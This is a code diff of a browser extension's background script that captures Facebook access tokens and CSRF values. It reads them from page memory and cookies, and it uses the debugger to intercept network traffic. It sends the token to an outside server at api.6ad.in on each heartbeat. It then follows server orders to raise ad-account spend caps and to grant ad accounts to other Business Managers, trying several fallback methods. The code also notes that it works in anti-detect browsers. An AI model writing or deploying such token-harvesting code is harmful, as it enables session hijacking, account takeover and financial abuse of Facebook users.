@@ -8,8 +8,6 @@
 const DEFAULT_API_URL = 'https://api.6ad.in'
 const POLL_INTERVAL_SECONDS = 10
 const HEARTBEAT_ALARM = '6ad-heartbeat'
-const FB_GRAPH_VERSION = 'v18.0'
-const FB_GRAPH_BASE = `https://graph.facebook.com/${FB_GRAPH_VERSION}`
 
 // ==================== STATE ====================
 
@@ -89,96 +87,99 @@ async function apiRequest(endpoint, method = 'GET', body = null) {
   return response.json()
 }
 
-// ==================== FACEBOOK GRAPH API ====================
-
-async function fbGraphRequest(endpoint, method = 'GET', params = {}) {
-  const config = await getConfig()
-  if (!config.fbAccessToken) throw new Error('No Facebook access token')
-
-  const url = new URL(`${FB_GRAPH_BASE}${endpoint}`)
-  params.access_token = config.fbAccessToken
-
-  if (method === 'GET') {
-    Object.entries(params).forEach(([k, v]) => url.searchParams.set(k, v))
-    const response = await fetch(url.toString())
-    if (!response.ok) {
-      const err = await response.json().catch(() => ({}))
-      throw new Error(err.error?.message || `FB API ${response.status}`)
-    }
-    return response.json()
-  } else {
-    const response = await fetch(url.toString(), {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams(params).toString()
-    })
-    if (!response.ok) {
-      const err = await response.json().catch(() => ({}))
-      throw new Error(err.error?.message || `FB API ${response.status}`)
-    }
-    return response.json()
-  }
-}
-
-// ==================== TOKEN CAPTURE VIA COOKIES ====================
-// Use Facebook cookies to generate an access token via Graph API
+// ==================== TOKEN CAPTURE ====================
+// Primary method: Extract __accessToken from Facebook page's JS runtime via chrome.scripting
+// Backup: Debugger intercepts network requests for EAA tokens
+// This is the same approach that SMIT/sMeta extensions use — no public Graph API calls from service worker
 
 async function tryCaptureFBToken() {
   try {
-    // Get Facebook cookies
-    const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' })
-    const cookieMap = {}
-    for (const c of cookies) {
-      cookieMap[c.name] = c.value
-    }
+    const tabs = await chrome.tabs.query({
+      url: [
+        'https://www.facebook.com/*',
+        'https://business.facebook.com/*',
+        'https://adsmanager.facebook.com/*'
+      ]
+    })
 
-    const cUser = cookieMap['c_user']
-    const xs = cookieMap['xs']
-    const datr = cookieMap['datr']
-
-    if (!cUser || !xs) {
-      console.log('[6AD] No FB session cookies found (c_user, xs)')
+    if (tabs.length === 0) {
+      console.log('[6AD] No Facebook tabs open for token capture')
       return false
     }
 
-    // Build cookie string for requests
-    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ')
+    for (const tab of tabs) {
+      try {
+        // PRIMARY METHOD: Extract __accessToken from page's JS runtime
+        // This is the most reliable method — same as SMIT/sMeta extensions
+        const results = await chrome.scripting.executeScript({
+          target: { tabId: tab.id },
+          world: 'MAIN',
+          func: () => {
+            try {
+              const result = {}
+              const html = document.documentElement.innerHTML
 
-    // Method: Fetch facebook.com/adsmanager and extract EAA token from response
-    // FB embeds EAA tokens in the HTML/JS of ads-related pages
-    const response = await fetch('https://business.facebook.com/business_locations/', {
-      headers: {
-        'Cookie': cookieStr,
-        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-      },
-      credentials: 'include'
-    })
+              // 1. __accessToken — Facebook's main user token stored in window
+              if (window.__accessToken) {
+                result.token = window.__accessToken
+                result.source = '__accessToken'
+              }
 
-    if (!response.ok) {
-      console.log('[6AD] FB page fetch failed:', response.status)
-      return false
+              // 2. Fallback: search HTML for EAA tokens
+              if (!result.token) {
+                const tokens = []
+                const regex = /["']?(EAA[a-zA-Z0-9]{40,})["']?/g
+                let m
+                while ((m = regex.exec(html)) !== null) {
+                  tokens.push(m[1])
+                }
+                if (tokens.length > 0) {
+                  tokens.sort((a, b) => b.length - a.length)
+                  result.token = tokens[0]
+                  result.source = 'html'
+                }
+              }
+
+              // 3. Get user info
+              const cUser = document.cookie.match(/c_user=(\d+)/)
+              if (cUser) result.userId = cUser[1]
+
+              const um = html.match(/"USER_ID":"(\d+)"/)
+              if (um) result.userId = um[1]
+
+              return result
+            } catch (e) {
+              return { error: e.message }
+            }
+          }
+        })
+
+        const result = results?.[0]?.result
+        if (result && result.token && result.token.startsWith('EAA') && result.token.length >= 20) {
+          console.log(`[6AD] Token captured via ${result.source} (length: ${result.token.length})`)
+          await handleTokenCapture(result.token)
+
+          // Also save user info if available
+          if (result.userId) {
+            const config = await getConfig()
+            if (result.userId !== config.fbUserId) {
+              await updateConfig({
+                fbUserId: result.userId,
+                fbUserName: config.fbUserName || 'FB User ' + result.userId,
+              })
+            }
+          }
+          return true
+        }
+      } catch (err) {
+        console.log('[6AD] Script injection failed for tab', tab.id, ':', err.message)
+      }
     }
 
-    const text = await response.text()
-
-    // Look for EAA token in the response
-    const tokenMatch = text.match(/EAA[a-zA-Z0-9]{50,}/)
-    if (tokenMatch) {
-      await handleTokenCapture(tokenMatch[0])
-      return true
-    }
-
-    // Alternative: try the Graph API directly with cookies
-    // Facebook's own pages use a first-party cookie-based auth
-    const graphResponse = await fetch('https://graph.facebook.com/v18.0/me?fields=id,name&access_token=', {
-      headers: { 'Cookie': cookieStr },
-      credentials: 'include'
-    })
-
-    console.log('[6AD] No EAA token found in page response')
+    console.log('[6AD] No token found via script injection')
     return false
   } catch (err) {
-    console.error('[6AD] Cookie-based token capture failed:', err.message)
+    console.error('[6AD] Token capture failed:', err.message)
     return false
   }
 }
@@ -222,15 +223,26 @@ async function attachDebuggerToFBTabs() {
   }
 }
 
-// Listen for debugger events (network requests)
-chrome.debugger.onEvent.addListener((source, method, params) => {
+// Listen for debugger events (network requests AND responses)
+chrome.debugger.onEvent.addListener(async (source, method, params) => {
   if (method === 'Network.requestWillBeSent') {
     const url = params.request?.url || ''
     const postData = params.request?.postData || ''
+    const headers = params.request?.headers || {}
+
+    // Check Authorization header too
+    const authHeader = headers['Authorization'] || headers['authorization'] || ''
+    if (authHeader.includes('EAA')) {
+      const authMatch = authHeader.match(/EAA[a-zA-Z0-9]{20,}/)
+      if (authMatch) {
+        validateAndSaveToken(authMatch[0])
+        return
+      }
+    }
 
     // Extract token from URL or POST body
     // Token can contain a-z, A-Z, 0-9 and may be URL-encoded
-    const tokenRegex = /access_token=(EAA[a-zA-Z0-9%_-]+)/
+    const tokenRegex = /access_token=(EAA[a-zA-Z0-9%_.-]+)/
 
     const urlMatch = url.match(tokenRegex)
     if (urlMatch) {
@@ -250,8 +262,9 @@ chrome.debugger.onEvent.addListener((source, method, params) => {
       return
     }
 
-    // Broader match in any part of the data
-    const anyMatch = (url + ' ' + postData).match(/EAA[a-zA-Z0-9%_-]{50,}/)
+    // Broader match in any part of the data (lowered threshold from 50 to 20 chars)
+    const combined = url + ' ' + postData
+    const anyMatch = combined.match(/EAA[a-zA-Z0-9%_.-]{20,}/)
     if (anyMatch) {
       try {
         const token = decodeURIComponent(anyMatch[0])
@@ -259,37 +272,98 @@ chrome.debugger.onEvent.addListener((source, method, params) => {
       } catch { validateAndSaveToken(anyMatch[0]) }
     }
   }
+
+  // Also try to get tokens from response bodies
+  if (method === 'Network.responseReceived') {
+    const url = params.response?.url || ''
+    // Only check graph.facebook.com or facebook.com API responses
+    if (url.includes('facebook.com') || url.includes('fbcdn.net')) {
+      try {
+        const requestId = params.requestId
+        if (requestId && source.tabId) {
+          const responseBody = await chrome.debugger.sendCommand(
+            { tabId: source.tabId },
+            'Network.getResponseBody',
+            { requestId }
+          )
+          if (responseBody && responseBody.body) {
+            const bodyStr = responseBody.body.substring(0, 5000) // Only check first 5KB
+            const tokenMatch = bodyStr.match(/EAA[a-zA-Z0-9]{20,}/)
+            if (tokenMatch) {
+              validateAndSaveToken(tokenMatch[0])
+            }
+          }
+        }
+      } catch {
+        // Response body might not be available yet or already gone
+      }
+    }
+  }
 })
 
-// Validate token against Graph API before saving
-let lastValidatedToken = null
-let isValidating = false
+// Token collection — Facebook pages emit many different EAA tokens.
+// We collect them over a short window and pick the LONGEST one (the main user token).
+let collectedTokens = []
+let tokenCollectionTimer = null
+let savedTokenSet = new Set() // Avoid re-processing tokens we already saved
 
 async function validateAndSaveToken(token) {
   if (!token || token.indexOf('EAA') !== 0 || token.length < 20) return
-  if (token === lastValidatedToken) return
-  if (isValidating) return
+  // Skip very short tokens (likely app tokens, not user tokens)
+  if (token.length < 40) return
+  // Skip tokens we've already processed
+  if (savedTokenSet.has(token)) return
 
-  isValidating = true
+  console.log('[6AD] EAA token seen (length:', token.length, ')')
+  collectedTokens.push(token)
+
+  // Debounce — wait 3 seconds after last token, then pick the best one
+  if (tokenCollectionTimer) clearTimeout(tokenCollectionTimer)
+  tokenCollectionTimer = setTimeout(() => pickBestToken(), 3000)
+}
+
+async function pickBestToken() {
+  if (collectedTokens.length === 0) return
+
+  // Pick the longest token — Facebook's main user access token is the longest
+  const sorted = [...collectedTokens].sort((a, b) => b.length - a.length)
+  const bestToken = sorted[0]
+
+  // Mark all collected tokens as processed
+  for (const t of collectedTokens) {
+    savedTokenSet.add(t)
+  }
+  collectedTokens = []
+
+  // Only save if it's different from current OR longer
+  const config = await getConfig()
+  if (bestToken === config.fbAccessToken) return
+  if (config.fbAccessToken && bestToken.length < config.fbAccessToken.length) {
+    console.log('[6AD] Skipping shorter token (current:', config.fbAccessToken.length, 'new:', bestToken.length, ')')
+    return
+  }
+
+  console.log('[6AD] Best token selected (length:', bestToken.length, 'from', sorted.length, 'candidates)')
+  await handleTokenCapture(bestToken)
+
+  // Get user info from cookies instead of Graph API
   try {
-    // Quick test: call /me with this token
-    const response = await fetch(`https://graph.facebook.com/v18.0/me?fields=id,name&access_token=${encodeURIComponent(token)}`)
-    const data = await response.json()
-
-    if (data.id && data.name) {
-      // Valid token!
-      lastValidatedToken = token
-      console.log('[6AD] Valid token found for user:', data.name)
-      await handleTokenCapture(token)
-      await updateConfig({ fbUserId: data.id, fbUserName: data.name })
-      await addActivity('success', `FB connected: ${data.name} (${data.id})`)
-    } else if (data.error) {
-      console.log('[6AD] Token invalid:', data.error.message)
+    const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' })
+    const cUser = cookies.find(c => c.name === 'c_user')
+    if (cUser) {
+      const updates = {}
+      if (cUser.value !== config.fbUserId) {
+        updates.fbUserId = cUser.value
+      }
+      if (!config.fbUserName || config.fbUserName === 'Not connected') {
+        updates.fbUserName = 'FB User ' + cUser.value
+      }
+      if (Object.keys(updates).length > 0) {
+        await updateConfig(updates)
+      }
     }
-  } catch (err) {
-    console.log('[6AD] Token validation error:', err.message)
-  } finally {
-    isValidating = false
+  } catch (cookieErr) {
+    console.log('[6AD] Cookie read failed:', cookieErr.message)
   }
 }
 
@@ -313,30 +387,61 @@ chrome.debugger.onDetach.addListener((source, reason) => {
 async function discoverAdAccounts() {
   try {
     const config = await getConfig()
-    if (!config.fbAccessToken) return []
+    if (!config.fbAccessToken) return config.adAccountIds || []
 
-    const result = await fbGraphRequest('/me/adaccounts', 'GET', {
-      fields: 'account_id,name',
-      limit: '200'
-    })
-
-    const accounts = (result.data || []).map(a => a.account_id)
-
+    // Use page context to discover ad accounts (same approach as token capture)
     try {
-      const me = await fbGraphRequest('/me', 'GET', { fields: 'id,name' })
-      await updateConfig({
-        fbUserId: me.id || config.fbUserId,
-        fbUserName: me.name || config.fbUserName,
-        adAccountIds: accounts
-      })
-    } catch {
-      await updateConfig({ adAccountIds: accounts })
-    }
+      const fbTab = await findFbTab()
+      const results = await chrome.scripting.executeScript({
+        target: { tabId: fbTab.id },
+        world: 'MAIN',
+        func: async () => {
+          try {
+            const token = window.__accessToken
+            if (!token) return { error: 'No __accessToken' }
 
-    return accounts
+            const resp = await fetch(`https://graph.facebook.com/v21.0/me/adaccounts?fields=account_id,name&limit=200&access_token=${encodeURIComponent(token)}`, {
+              credentials: 'include'
+            })
+            const data = await resp.json()
+            if (data.error) return { error: data.error.message }
+
+            const accounts = (data.data || []).map(a => a.account_id)
+
+            // Also get user info
+            let userName = null
+            try {
+              const meResp = await fetch(`https://graph.facebook.com/v21.0/me?fields=id,name&access_token=${encodeURIComponent(token)}`, {
+                credentials: 'include'
+              })
+              const meData = await meResp.json()
+              if (meData.name) userName = meData.name
+            } catch {}
+
+            return { accounts, userName }
+          } catch (e) {
+            return { error: e.message }
+          }
+        }
+      })
+
+      const result = results?.[0]?.result
+      if (result && !result.error && result.accounts) {
+        const updates = { adAccountIds: result.accounts }
+        if (result.userName) updates.fbUserName = result.userName
+        await updateConfig(updates)
+        console.log(`[6AD] Discovered ${result.accounts.length} ad accounts`)
+        return result.accounts
+      } else {
+        console.log('[6AD] Ad account discovery failed:', result?.error || 'unknown')
+        return config.adAccountIds || []
+      }
+    } catch (err) {
+      console.log('[6AD] Ad account discovery failed:', err.message)
+      return config.adAccountIds || []
+    }
   } catch (err) {
     console.error('[6AD] Failed to discover ad accounts:', err.message)
-    await addActivity('error', `Ad account discovery failed: ${err.message}`)
     return []
   }
 }
@@ -348,24 +453,20 @@ async function sendHeartbeat() {
   if (!config.apiKey || !config.isEnabled) return
 
   try {
+    // Always attach debugger to FB tabs (no-op if already attached)
+    await attachDebuggerToFBTabs()
+
     // Try to capture token if we don't have one
     if (!config.fbAccessToken) {
-      // Try cookie-based capture
       await tryCaptureFBToken()
-      // Also try attaching debugger to FB tabs
-      await attachDebuggerToFBTabs()
     }
 
     // Re-read config after potential token capture
     const updatedConfig = await getConfig()
 
-    let adAccountIds = updatedConfig.adAccountIds || []
-    if (updatedConfig.fbAccessToken) {
-      adAccountIds = await discoverAdAccounts()
-    }
-
+    // Send heartbeat FIRST — don't let account discovery block it
     const result = await apiRequest('/extension/heartbeat', 'POST', {
-      adAccountIds,
+      adAccountIds: updatedConfig.adAccountIds || [],
       fbUserId: updatedConfig.fbUserId || undefined,
       fbUserName: updatedConfig.fbUserName || undefined,
       fbAccessToken: updatedConfig.fbAccessToken || undefined
@@ -375,6 +476,17 @@ async function sendHeartbeat() {
       lastHeartbeat: Date.now(),
       lastError: null
     })
+
+    console.log('[6AD] Heartbeat OK, pending recharges:', result.pendingCount, 'pending BM shares:', result.pendingBmShareCount)
+
+    if (result.pendingCount > 0 || result.pendingBmShareCount > 0) {
+      await addActivity('info', `Heartbeat: ${result.pendingCount} recharges, ${result.pendingBmShareCount} BM shares pending`)
+    }
+
+    // Try account discovery in background (don't block heartbeat)
+    if (updatedConfig.fbAccessToken) {
+      discoverAdAccounts().catch(e => console.log('[6AD] Account discovery error:', e.message))
+    }
 
     if (result.pendingCount > 0) {
       await checkAndProcessRecharges()
@@ -428,31 +540,94 @@ async function processRecharge(recharge) {
     await addActivity('info', `Claiming recharge for act_${accountId} ($${depositAmount})`)
     await apiRequest(`/extension/recharge/${depositId}/claim`, 'POST')
 
-    const accountData = await fbGraphRequest(`/act_${accountId}`, 'GET', {
-      fields: 'spend_cap,amount_spent,name'
+    const fbTab = await findFbTab()
+    const ctx = await getFbPageContext(fbTab)
+    console.log('[6AD] Got FB page context for recharge — token:', ctx.accessToken?.substring(0, 15) + '...')
+
+    // Execute recharge via injected script in Facebook tab context
+    // Uses page's own __accessToken which works with Graph API from same-origin
+    const results = await chrome.scripting.executeScript({
+      target: { tabId: fbTab.id },
+      world: 'MAIN',
+      func: async (accountId, accessToken, dtsg, userId, depositAmount) => {
+        try {
+          // Step 1: Get current spend cap using internal API
+          const getUrl = `https://graph.facebook.com/v21.0/act_${accountId}?fields=spend_cap,amount_spent,name&access_token=${encodeURIComponent(accessToken)}`
+          const getResp = await fetch(getUrl, { credentials: 'include' })
+          const getText = await getResp.text()
+          let accountData
+          try {
+            accountData = JSON.parse(getText)
+          } catch {
+            // Try internal endpoint as fallback
+            const intResp = await fetch('https://business.facebook.com/api/graphql/', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              credentials: 'include',
+              body: new URLSearchParams({
+                fb_dtsg: dtsg,
+                __user: userId,
+                __a: '1',
+                variables: JSON.stringify({ adAccountId: `act_${accountId}`, fields: ['spend_cap', 'amount_spent', 'name'] }),
+              }).toString()
+            })
+            const intText = await intResp.text()
+            const clean = intText.replace(/^for\s*\(;;\);?\s*/, '')
+            accountData = JSON.parse(clean)
+          }
+
+          if (accountData.error) return { error: accountData.error.message }
+
+          const currentCapCents = parseInt(accountData.spend_cap || '0', 10)
+          const spentCents = parseInt(accountData.amount_spent || '0', 10)
+          const currentCapDollars = currentCapCents / 100
+          const spentDollars = spentCents / 100
+          const newCapDollars = currentCapDollars + depositAmount
+
+          // Step 2: Set new spend cap
+          const postResp = await fetch(`https://graph.facebook.com/v21.0/act_${accountId}`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            credentials: 'include',
+            body: new URLSearchParams({
+              spend_cap: newCapDollars.toString(),
+              access_token: accessToken
+            }).toString()
+          })
+          const postText = await postResp.text()
+          let postData
+          try {
+            postData = JSON.parse(postText)
+          } catch {
+            return { error: 'Invalid response from spend_cap update: ' + postText.substring(0, 200) }
+          }
+          if (postData.error) return { error: postData.error.message }
+
+          return {
+            success: true,
+            currentCapDollars,
+            spentDollars,
+            newCapDollars
+          }
+        } catch (e) {
+          return { error: e.message }
+        }
+      },
+      args: [accountId, ctx.accessToken, ctx.dtsg, ctx.userId, depositAmount]
     })
 
-    // FB Graph API GET returns spend_cap/amount_spent in CENTS (hundredths)
-    // FB Graph API POST accepts spend_cap in DOLLARS
-    // So: read cents, convert to dollars, do math in dollars, post dollars
-    const currentCapCents = parseInt(accountData.spend_cap || '0', 10)
-    const spentCents = parseInt(accountData.amount_spent || '0', 10)
-    const currentCapDollars = currentCapCents / 100
-    const spentDollars = spentCents / 100
-    const newCapDollars = currentCapDollars + depositAmount
+    const result = results?.[0]?.result
+    if (!result) throw new Error('Script injection returned no result')
+    if (result.error) throw new Error(result.error)
 
-    await addActivity('info', `act_${accountId}: spent $${spentDollars.toFixed(2)}, cap $${currentCapDollars.toFixed(2)} → new cap $${newCapDollars.toFixed(2)}`)
-
-    await fbGraphRequest(`/act_${accountId}`, 'POST', {
-      spend_cap: newCapDollars.toString()
-    })
+    await addActivity('info', `act_${accountId}: spent $${result.spentDollars.toFixed(2)}, cap $${result.currentCapDollars.toFixed(2)} → $${result.newCapDollars.toFixed(2)}`)
 
     await apiRequest(`/extension/recharge/${depositId}/complete`, 'POST', {
-      previousSpendCap: currentCapDollars,
-      newSpendCap: newCapDollars
+      previousSpendCap: result.currentCapDollars,
+      newSpendCap: result.newCapDollars
     })
 
-    await addActivity('success', `Recharged act_${accountId} +$${depositAmount.toFixed(2)} (new cap: $${newCapDollars.toFixed(2)})`)
+    await addActivity('success', `Recharged act_${accountId} +$${depositAmount.toFixed(2)} (new cap: $${result.newCapDollars.toFixed(2)})`)
     console.log(`[6AD] Successfully recharged act_${accountId}`)
 
   } catch (err) {
@@ -479,11 +654,22 @@ async function checkAndProcessBmShares() {
 
   try {
     const config = await getConfig()
-    if (!config.apiKey || !config.isEnabled || !config.fbAccessToken) return
+    if (!config.apiKey || !config.isEnabled || !config.fbAccessToken) {
+      console.log('[6AD] BM share check skipped:', !config.apiKey ? 'no key' : !config.isEnabled ? 'disabled' : 'no token')
+      return
+    }
 
+    await addActivity('info', 'Checking for pending BM shares...')
     const result = await apiRequest('/extension/pending-bm-shares', 'GET')
     const bmShares = result.bmShares || []
+    console.log('[6AD] Found', bmShares.length, 'pending BM shares')
 
+    if (bmShares.length === 0) {
+      await addActivity('info', 'No pending BM shares')
+      return
+    }
+
+    await addActivity('info', `Found ${bmShares.length} pending BM share(s)`)
     for (const share of bmShares) {
       await processBmShare(share)
     }
@@ -495,11 +681,134 @@ async function checkAndProcessBmShares() {
   }
 }
 
+/**
+ * Extract Facebook page context tokens (__accessToken, fb_dtsg, __user, lsd)
+ * This is how extensions like SMIT work — they read tokens from the page's JS runtime
+ * instead of using the public Graph API.
+ */
+async function getFbPageContext(tab) {
+  const results = await chrome.scripting.executeScript({
+    target: { tabId: tab.id },
+    world: 'MAIN',
+    func: () => {
+      try {
+        const ctx = {}
+        const html = document.documentElement.innerHTML
+
+        // 1. __accessToken — Facebook stores the current user's access token here
+        if (window.__accessToken) {
+          ctx.accessToken = window.__accessToken
+          ctx.tokenSource = '__accessToken'
+        }
+
+        // 1b. Fallback: search HTML for EAA tokens (works in AdsPower/anti-detect browsers)
+        if (!ctx.accessToken) {
+          const tokens = []
+          const regex = /["']?(EAA[a-zA-Z0-9]{40,})["']?/g
+          let m
+          while ((m = regex.exec(html)) !== null) {
+            tokens.push(m[1])
+          }
+          if (tokens.length > 0) {
+            tokens.sort((a, b) => b.length - a.length)
+            ctx.accessToken = tokens[0]
+            ctx.tokenSource = 'html_scan'
+          }
+        }
+
+        // 1c. Fallback: Try Facebook's require system
+        if (!ctx.accessToken && typeof require === 'function') {
+          try {
+            const mod = require('CurrentAccessToken')
+            if (mod && mod.getToken) {
+              ctx.accessToken = mod.getToken()
+              ctx.tokenSource = 'require'
+            }
+          } catch(e) {}
+        }
+
+        // 2. fb_dtsg — CSRF token
+        let m = html.match(/"DTSGInitialData".*?"token":"([^"]+)"/)
+        if (m) { ctx.dtsg = m[1] }
+        else {
+          const input = document.querySelector('input[name="fb_dtsg"]')
+          if (input) { ctx.dtsg = input.value }
+          else {
+            m = html.match(/"token":"(AQ[A-Za-z0-9_-]+)"/)
+            if (m) ctx.dtsg = m[1]
+          }
+        }
+
+        // 3. __user — current user ID
+        m = html.match(/"USER_ID":"(\d+)"/)
+        if (m) { ctx.userId = m[1] }
+        else {
+          const m2 = html.match(/"CurrentUserInitialData".*?"USER_ID":"(\d+)"/)
+          if (m2) ctx.userId = m2[1]
+        }
+        // Fallback: cookie
+        if (!ctx.userId) {
+          const cUser = document.cookie.match(/c_user=(\d+)/)
+          if (cUser) ctx.userId = cUser[1]
+        }
+
+        // 4. lsd token
+        m = html.match(/"LSD".*?"token":"([^"]+)"/)
+        if (m) ctx.lsd = m[1]
+
+        return ctx
+      } catch (e) {
+        return { error: e.message }
+      }
+    }
+  })
+
+  const ctx = results?.[0]?.result
+  if (!ctx || ctx.error) {
+    throw new Error(ctx?.error || 'Failed to extract Facebook page context')
+  }
+
+  // If still no accessToken from page, use the one we captured via debugger
+  if (!ctx.accessToken) {
+    const config = await getConfig()
+    if (config.fbAccessToken) {
+      ctx.accessToken = config.fbAccessToken
+      ctx.tokenSource = 'stored_debugger'
+      console.log('[6AD] Using stored debugger token as fallback (page had no __accessToken)')
+    }
+  }
+
+  if (!ctx.accessToken) {
+    throw new Error('No access token found — open Facebook and browse around to capture a token')
+  }
+  if (!ctx.dtsg) {
+    throw new Error('Could not find fb_dtsg on page — try refreshing the Facebook page')
+  }
+
+  console.log(`[6AD] Page context: token via ${ctx.tokenSource}, dtsg=${ctx.dtsg?.substring(0, 8)}..., user=${ctx.userId}`)
+  return ctx
+}
+
+/**
+ * Find a Facebook tab, preferring business.facebook.com
+ */
+async function findFbTab() {
+  const tabs = await chrome.tabs.query({
+    url: ['https://business.facebook.com/*', 'https://www.facebook.com/*', 'https://adsmanager.facebook.com/*']
+  })
+  if (tabs.length === 0) {
+    throw new Error('No Facebook tab open — open business.facebook.com first')
+  }
+  // Prefer business.facebook.com tabs (same-origin for BM API calls)
+  const bizTab = tabs.find(t => t.url.includes('business.facebook.com'))
+  return bizTab || tabs[0]
+}
+
 async function processBmShare(share) {
-  // API returns: requestId, adAccountId, adAccountName, userBmId, username
   const requestId = share.requestId
   const accountId = share.adAccountId
   const userBmId = share.userBmId
+  const ownerBmId = share.ownerBmId  // The BM that owns this ad account
   const username = share.username
 
   if (!requestId || !accountId || !userBmId) {
@@ -508,34 +817,121 @@ async function processBmShare(share) {
   }
 
   try {
-    await addActivity('info', `Claiming BM share: act_${accountId} → BM ${userBmId} (${username})`)
+    await addActivity('info', `Claiming BM share: act_${accountId} → BM ${userBmId} (${username})${ownerBmId ? ` [owner BM: ${ownerBmId}]` : ''}`)
     await apiRequest(`/extension/bm-share/${requestId}/claim`, 'POST')
 
-    // Call Facebook Graph API to share the ad account to user's BM
-    // POST /{userBmId}/client_ad_accounts
-    const config = await getConfig()
-    const url = `${FB_GRAPH_BASE}/${userBmId}/client_ad_accounts`
+    const fbTab = await findFbTab()
+    const ctx = await getFbPageContext(fbTab)
+    console.log('[6AD] Got FB page context for BM share — token:', ctx.accessToken?.substring(0, 15) + '...')
 
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({
-        adaccount_id: `act_${accountId}`,
-        permitted_tasks: JSON.stringify(['MANAGE', 'ADVERTISE', 'ANALYZE']),
-        access_token: config.fbAccessToken
-      }).toString()
+    // Execute BM share from the page context using Facebook's Graph API
+    // The logged-in user is the OWNER of the ad account.
+    // We try multiple approaches to share the ad account to the user's BM:
+    //
+    // Method 1: POST /act_{id}/agencies — owner assigns partner BM to their ad account
+    // Method 2: POST /{ownerBmId}/client_ad_accounts — owner's BM adds ad account as client for partner
+    // Method 3: POST /{userBmId}/client_ad_accounts — direct assignment (needs MANAGE_AD_ACCOUNTS)
+    const shareResults = await chrome.scripting.executeScript({
+      target: { tabId: fbTab.id },
+      world: 'MAIN',
+      func: async (userBmId, adAccountId, ownerBmId, accessToken) => {
+        const graphBase = 'https://graph.facebook.com/v21.0'
+        const errors = []
+
+        // Helper to try a Graph API call
+        async function tryMethod(name, url, params) {
+          try {
+            const resp = await fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              credentials: 'include',
+              body: new URLSearchParams({
+                ...params,
+                access_token: accessToken,
+              }).toString()
+            })
+            const text = await resp.text()
+            try {
+              const data = JSON.parse(text)
+              if (data.error) {
+                errors.push(`${name}: ${data.error.message} (code ${data.error.code})`)
+                return null
+              }
+              return { success: true, data, method: name }
+            } catch {
+              errors.push(`${name}: non-JSON response: ${text.substring(0, 100)}`)
+              return null
+            }
+          } catch (e) {
+            errors.push(`${name}: ${e.message}`)
+            return null
+          }
+        }
+
+        // Default permission: ADVERTISE = "Manage campaigns (ads)" + ANALYZE = "View performance"
+        const defaultTasks = ['ADVERTISE', 'ANALYZE']
+
+        // Method 1: POST /act_{id}/agencies — Add partner BM as agency on the ad account
+        // This is what happens when owner says "share this ad account with partner BM"
+        let result = await tryMethod(
+          'agencies',
+          `${graphBase}/act_${adAccountId}/agencies`,
+          {
+            business: userBmId,
+            permitted_tasks: JSON.stringify(defaultTasks),
+          }
+        )
+        if (result) return result
+
+        // Method 2: If we know the owner's BM, try adding as client_ad_accounts from owner's BM
+        if (ownerBmId) {
+          result = await tryMethod(
+            'owner_client_ad_accounts',
+            `${graphBase}/${ownerBmId}/client_ad_accounts`,
+            {
+              adaccount_id: `act_${adAccountId}`,
+              permitted_tasks: JSON.stringify(defaultTasks),
+            }
+          )
+          if (result) return result
+        }
+
+        // Method 3: POST /{userBmId}/client_ad_accounts — try direct assignment
+        result = await tryMethod(
+          'user_client_ad_accounts',
+          `${graphBase}/${userBmId}/client_ad_accounts`,
+          {
+            adaccount_id: `act_${adAccountId}`,
+            permitted_tasks: JSON.stringify(defaultTasks),
+          }
+        )
+        if (result) return result
+
+        // Method 4: POST /act_{id}/assigned_users — share to individual business user
+        // (fallback, may not work for BM sharing)
+        result = await tryMethod(
+          'assigned_users',
+          `${graphBase}/act_${adAccountId}/assigned_users`,
+          {
+            business: userBmId,
+            tasks: JSON.stringify(defaultTasks),
+          }
+        )
+        if (result) return result
+
+        return { error: errors.join(' | ') }
+      },
+      args: [userBmId, accountId, ownerBmId || '', ctx.accessToken]
     })
 
-    const result = await response.json()
-
-    if (result.error) {
-      throw new Error(result.error.message || 'Facebook API error')
-    }
+    const result = shareResults?.[0]?.result
+    if (!result) throw new Error('Script injection returned no result')
+    if (result.error) throw new Error(result.error)
 
     // Success!
     await apiRequest(`/extension/bm-share/${requestId}/complete`, 'POST')
-    await addActivity('success', `BM shared: act_${accountId} → BM ${userBmId} (${username})`)
-    console.log(`[6AD] Successfully shared act_${accountId} to BM ${userBmId}`)
+    await addActivity('success', `BM shared: act_${accountId} → BM ${userBmId} (${username}) [${result.method}]`)
+    console.log(`[6AD] Successfully shared act_${accountId} to BM ${userBmId} via ${result.method}`)
 
   } catch (err) {
     console.error(`[6AD] BM share failed for act_${accountId}:`, err.message)
@@ -562,24 +958,6 @@ chrome.alarms.onAlarm.addListener(async (alarm) => {
     const config = await getConfig()
     if (config.isEnabled && config.apiKey) {
       await sendHeartbeat()
-    }
-  }
-})
-
-// ==================== TAB MONITORING ====================
-// When a Facebook tab loads, try to attach debugger
-
-chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete' && tab.url && isFacebookUrl(tab.url)) {
-    if (!attachedTabIds.has(tabId)) {
-      try {
-        await chrome.debugger.attach({ tabId }, '1.3')
-        await chrome.debugger.sendCommand({ tabId }, 'Network.enable')
-        attachedTabIds.add(tabId)
-        console.log('[6AD] Auto-attached debugger to tab', tabId)
-      } catch (err) {
-        console.log('[6AD] Auto-attach failed:', err.message)
-      }
     }
   }
 })
@@ -612,10 +990,11 @@ async function handleTokenCapture(token) {
   const config = await getConfig()
   if (token !== config.fbAccessToken) {
     await updateConfig({ fbAccessToken: token })
-    await addActivity('info', `Facebook token updated (${token.substring(0, 12)}...)`)
-    console.log('[6AD] New FB token stored')
+    await addActivity('success', `Token saved (len=${token.length}, ${token.substring(0, 15)}...)`)
+    console.log('[6AD] New FB token stored, length:', token.length)
 
-    await discoverAdAccounts()
+    // Trigger a heartbeat to send token to server immediately
+    setTimeout(sendHeartbeat, 2000)
   }
 }
 
